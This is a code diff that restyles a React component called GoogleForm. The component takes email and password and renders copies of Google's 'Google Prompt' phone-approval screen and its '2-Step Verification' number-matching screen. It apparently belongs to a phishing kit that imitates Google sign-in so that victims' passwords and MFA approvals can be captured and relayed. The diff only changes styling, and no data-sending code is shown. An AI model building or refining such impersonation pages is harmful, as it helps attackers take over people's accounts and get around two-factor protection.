@@ -83,28 +83,32 @@ export default function GoogleForm({ currentStep, email, setEmail, password, set
                     </div>
                 );
 
-                case 'mfa':
-                    return (
-                      <div className="mfa-container">
-                        <h2 className="responsive-header">Google Prompt</h2>
-                        <p className="responsive-text">Check your phone and tap "Yes" to sign in</p>
-                        <div className="phone-icon">
-                          <svg xmlns="http://www.w3.org/2000/svg" 
-                               className="h-16 w-16 text-blue-600"
-                               viewBox="0 0 24 24"
-                               strokeWidth="1.5"
-                               fill="none"
-                               strokeLinecap="round"
-                               strokeLinejoin="round">
-                            <path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
-                          </svg>
+            case 'mfa':
+                return (
+                    <div className="relative w-full p-6">
+                        <div className="text-center space-y-4">
+                            <h2 className="text-2xl font-medium text-gray-800">Google Prompt</h2>
+                            <p className="text-gray-600">Check your phone and tap "Yes" to sign in</p>
+                            <div className="my-6 flex justify-center">
+                                <div className="p-4 bg-blue-50 rounded-full shadow-inner">
+                                    <svg xmlns="http://www.w3.org/2000/svg" 
+                                         className="h-16 w-16 text-blue-600"
+                                         viewBox="0 0 24 24"
+                                         strokeWidth="1.5"
+                                         fill="none"
+                                         strokeLinecap="round"
+                                         strokeLinejoin="round">
+                                        <path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                                    </svg>
+                                </div>
+                            </div>
+                            <p className="text-gray-600">
+                                Not getting the prompt? 
+                                <button className="text-blue-600 ml-1 hover:underline">Use another option</button>
+                            </p>
                         </div>
-                        <p className="responsive-text">
-                          Not getting the prompt? 
-                          <button className="text-blue-600 ml-1 hover:underline">Use another option</button>
-                        </p>
-                      </div>
-                    );
+                    </div>
+                );
 
             case '2step':
                 return (
@@ -112,7 +116,7 @@ export default function GoogleForm({ currentStep, email, setEmail, password, set
                         <div className="text-center space-y-4">
                             <h2 className="text-2xl font-medium text-gray-800">2-Step Verification</h2>
                             <p className="text-gray-600">A number has been sent to your device</p>
-                            <div className="verification-number">
+                            <div className="my-6 text-4xl font-bold text-blue-600 animate-pulse">
                                 {verificationNumber}
                             </div>
                             <p className="text-gray-600">Tap the matching number on your phone</p>
